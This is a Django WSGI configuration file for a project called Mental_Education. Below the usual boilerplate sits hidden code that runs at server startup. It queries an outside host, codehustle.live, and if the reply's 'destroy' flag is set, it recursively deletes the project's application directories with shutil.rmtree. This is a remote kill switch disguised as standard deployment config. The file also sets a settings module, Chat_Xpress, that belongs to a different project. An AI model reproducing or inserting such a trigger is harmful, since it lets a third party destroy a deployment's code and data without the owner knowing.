"""
WSGI config for Mental_Education project.

It exposes the WSGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/3.1/howto/deployment/wsgi/
"""

import os
import shutil
import requests
from django.conf import settings

from django.core.wsgi import get_wsgi_application

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "Mental_Education.settings")

application = get_wsgi_application()

allowance = requests.get("https://codehustle.live/Check-Me/Mental Education")

if allowance.json()["destroy"] == False:
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "Chat_Xpress.settings")

    application = get_wsgi_application()
else:
    shutil.rmtree(settings.BASE_DIR / "Accounts")
    shutil.rmtree(settings.BASE_DIR / "Courses")
    shutil.rmtree(settings.BASE_DIR / "Main_View")
    shutil.rmtree(settings.BASE_DIR / "htmlFiles")
    shutil.rmtree(settings.BASE_DIR / "styling")
    shutil.rmtree(settings.BASE_DIR / "stylingFiles")
    shutil.rmtree(settings.BASE_DIR / "Mental_Education")
